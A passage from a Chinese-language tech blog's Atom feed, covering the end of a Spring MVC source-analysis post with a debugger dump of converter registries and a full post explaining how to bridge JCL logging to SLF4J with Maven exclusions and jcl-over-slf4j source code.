&quot;java.time.OffsetDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToInstantConverter@3b166fa9&quot;</span><br><span class="line">     84 = &#123;LinkedHashMap$Entry@6681&#125; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToZonedDateTimeConverter@2653dae9&quot;</span><br><span class="line">     85 = &#123;LinkedHashMap$Entry@6682&#125; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToOffsetDateTimeConverter@7f348ff0&quot;</span><br><span class="line">     86 = &#123;LinkedHashMap$Entry@6683&#125; &quot;java.util.Calendar -&gt; java.time.LocalDate&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateConverter@6e407d18&quot;</span><br><span class="line">     87 = &#123;LinkedHashMap$Entry@6684&#125; &quot;java.util.Calendar -&gt; java.time.LocalTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalTimeConverter@66a32c5e&quot;</span><br><span class="line">     88 = &#123;LinkedHashMap$Entry@6685&#125; &quot;java.util.Calendar -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateTimeConverter@5e9f36f1&quot;</span><br><span class="line">     89 = &#123;LinkedHashMap$Entry@6686&#125; &quot;java.util.Calendar -&gt; java.time.Instant&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToInstantConverter@50f69dd&quot;</span><br><span class="line">     90 = &#123;LinkedHashMap$Entry@6687&#125; &quot;java.lang.Long -&gt; java.time.Instant&quot; -&gt; &quot;java.lang.Long -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$LongToInstantConverter@684a7cd9&quot;</span><br><span class="line">     91 = &#123;LinkedHashMap$Entry@6688&#125; &quot;java.time.Instant -&gt; java.lang.Long&quot; -&gt; &quot;java.time.Instant -&gt; java.lang.Long : org.springframework.format.datetime.standard.DateTimeConverters$InstantToLongConverter@17f47c52&quot;</span><br><span class="line">     92 = &#123;LinkedHashMap$Entry@6689&#125; &quot;java.time.LocalDate -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0&quot;</span><br><span class="line">     93 = &#123;LinkedHashMap$Entry@6690&#125; &quot;java.lang.String -&gt; java.time.LocalDate&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDate: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDate: org.springframework.format.datetime.standard.TemporalAccessorParser@75d32f15&quot;</span><br><span class="line">     94 = &#123;LinkedHashMap$Entry@6691&#125; &quot;java.time.LocalTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41f1db11&quot;</span><br><span class="line">     95 = &#123;LinkedHashMap$Entry@6692&#125; &quot;java.lang.String -&gt; java.time.LocalTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2ea20f2c&quot;</span><br><span class="line">     96 = &#123;LinkedHashMap$Entry@6693&#125; &quot;java.time.LocalDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41fc9576&quot;</span><br><span class="line">     97 = &#123;LinkedHashMap$Entry@6694&#125; &quot;java.lang.String -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2dbba1db&quot;</span><br><span class="line">     98 = &#123;LinkedHashMap$Entry@6695&#125; &quot;java.time.ZonedDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.ZonedDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@625dde2e&quot;</span><br><span class="line">     99 = &#123;LinkedHashMap$Entry@6696&#125; &quot;java.lang.String -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.ZonedDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@5cb87626&quot;</span><br><span class="line">   converterCache = &#123;ConcurrentReferenceHashMap@6591&#125;  size = 1</span><br><span class="line">    0 = &#123;ConcurrentReferenceHashMap$Entry@7099&#125; &quot;ConverterCacheKey [sourceType = java.lang.String, targetType = @org.springframework.web.bind.annotation.RequestParam java.lang.String]&quot; -&gt; &quot;NO_OP&quot;</span><br><span class="line">  propertyEditorRegistrars = null</span><br></pre></td></tr></table></figure><h3 id="parameterNameDiscoverer"><a href="#parameterNameDiscoverer" class="headerlink" title="parameterNameDiscoverer"></a>parameterNameDiscoverer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.parameterNameDiscoverer = &#123;DefaultParameterNameDiscoverer@4866&#125; </span><br><span class="line"> parameterNameDiscoverers = &#123;LinkedList@7309&#125;  size = 2</span><br><span class="line">  0 = &#123;StandardReflectionParameterNameDiscoverer@7311&#125; </span><br><span class="line">  1 = &#123;LocalVariableTableParameterNameDiscoverer@7312&#125;</span><br></pre></td></tr></table></figure><p>容器的启动过程以及一次请求的详细处理过程: <a href="springmvc.log">启动日志</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;启动流程的分析见: &lt;a href=&quot;/2016/10/02/spring-mvc/&quot; title=&quot;Spring Mvc源码剖析(一)&quot;&gt;Spring Mvc源码剖析(一)&lt;/a&gt;&lt;/p&gt;
&lt;img src=&quot;/2018/05/06/spring-mvc-2/spring
      
    
    </summary>
    
      <category term="spring" scheme="http://qsli.github.io/categories/spring/"/>
    
    
      <category term="spring mvc" scheme="http://qsli.github.io/tags/spring-mvc/"/>
    
  </entry>
  
  <entry>
    <title>将其他日志框架桥接到slf4j</title>
    <link href="http://qsli.github.io/2018/05/05/slf4j-bridge/"/>
    <id>http://qsli.github.io/2018/05/05/slf4j-bridge/</id>
    <published>2018-05-05T08:14:59.000Z</published>
    <updated>2018-08-11T12:42:42.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SLF4J"><a href="#SLF4J" class="headerlink" title="SLF4J"></a>SLF4J</h2><p>java世界的日志框架太多了, <code>Jakarta Commons Logging (JCL)</code>,  java.util.logging (jul), Log4j, Logback等等. 其中 log4j和logback是同一个作者写的, 这个作者为了统一日志的API, 又创作了SLF4J, SLF4J采用门面模式定义了日志操作的API, 但是并没有提供实现,<br>具体的实现由用户引入的jar包决定, 比如Log4j或者Logback等.</p><p>为了能让之前的项目, 比如一个比较古老的项目使用了 JCL, 也能使用<code>SLF4J</code>带来的好处(接口和实现分离), 就出现了桥接的需求.</p><p> <img src="https://www.slf4j.org/images/legacy.png" alt></p><p> 一旦桥接到了<code>SLF4J</code>, 底层的日志实现就可以随便选了.</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p> 这里拿<code>JCL</code>为例, 介绍下如何使用桥接包.</p><ol><li>exclude掉<code>JCL</code>对应的jar包</li><li>引入<code>jcl-over-slf4j</code></li></ol><p>比如拿<code>spring mvc</code>为例, 他内部使用的是<code>JCL</code>作为日志实现, 我们需要做的就是:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--exclude--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;sl4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.slf4j/jcl-over-slf4j --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>桥接的实现原理就是不引入<code>JCL</code>等之前包的实现, 在桥接的jar包中实现一套相同的api.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  jcl-over-slf4j-1.7.25-sources  tree</span><br><span class="line">.</span><br><span class="line">├── META-INF</span><br><span class="line">│   ├── MANIFEST.MF</span><br><span class="line">│   └── services</span><br><span class="line">│       └── org.apache.commons.logging.LogFactory</span><br><span class="line">└── org</span><br><span class="line">    └── apache</span><br><span class="line">        └── commons</span><br><span class="line">            └── logging</span><br><span class="line">                ├── impl</span><br><span class="line">                │   ├── NoOpLog.java</span><br><span class="line">                │   ├── package.html</span><br><span class="line">                │   ├── SimpleLog.java</span><br><span class="line">                │   ├── SLF4JLocationAwareLog.java</span><br><span class="line">                │   ├── SLF4JLogFactory.java</span><br><span class="line">                │   └── SLF4JLog.java</span><br><span class="line">                ├── LogConfigurationException.java</span><br><span class="line">                ├── LogFactory.java</span><br><span class="line">                ├── Log.java</span><br><span class="line">                └── package.html</span><br></pre></td></tr></table></figure><p>在<code>LogFactory</code>中使用的是<code>SLF4JLogFactory</code>来获取<code>Logger</code>, 最终用到的是<code>slf4j-api</code>中定义的方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.logging.LogFactory</span></span><br><span class="line"><span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.logging.impl.SLF4JLogFactory#getInstance(java.lang.String)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Log <span class="title">getInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> LogConfigurationException </span>&#123;</span><br><span class="line">        Log instance = loggerMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (instance != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log newInstance;</span><br><span class="line">            Logger slf4jLogger = LoggerFactory.getLogger(name);</span><br><span class="line">            <span class="keyword">if</span> (slf4jLogger <span class="keyword">instanceof</span> LocationAwareLogger) &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLocationAwareLog((LocationAwareLogger) slf4jLogger);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newInstance = <span class="keyword">new</span> SLF4JLog(slf4jLogger);</span><br><span class="line">            &#125;</span><br><span class="line">            Log oldInstance = loggerMap.putIfAbsent(name, newInstance);</span><br><span class="line">            <span class="keyword">return</span> oldInstance == <span class="keyword">null</span> ? newInstance : oldInstance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.slf4j.org/legacy.html" rel="external nofollow noopener noreferrer" target="_blank">Log4j Bridge</a></li><li><a href="https://zhuanlan.zhihu.com/p/24272450" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(上) - 历史演进</a></li><li><a href="https://zhuanlan.zhihu.com/p/24275518" rel="external nofollow noopener noreferrer" target="_blank">Java 日志框架解析(下) - 最佳实践</a></li><li><a href="http://tech.lede.com/2017/02/06/rd/server/log4jSearch/index.html" rel="external nofollow noopener noreferrer" target="_blank">日志工具现状调研 | 网易乐得技术团队</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SLF4J&quot;&gt;&lt;a href=&quot;#SLF4J&quot; class=&quot;headerlink&quot; title=&quot;SLF4J&quot;&gt;&lt;/a&gt;SLF4J&lt;/h2&gt;&lt;p&gt;java世界的日志框架太多了, &lt;code&gt;Jakarta Commons Logging (JCL)&lt;/code&gt;
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="logback" scheme="http://qsli.github.io/tags/logback/"/>
    
  </entry>
  
</feed>
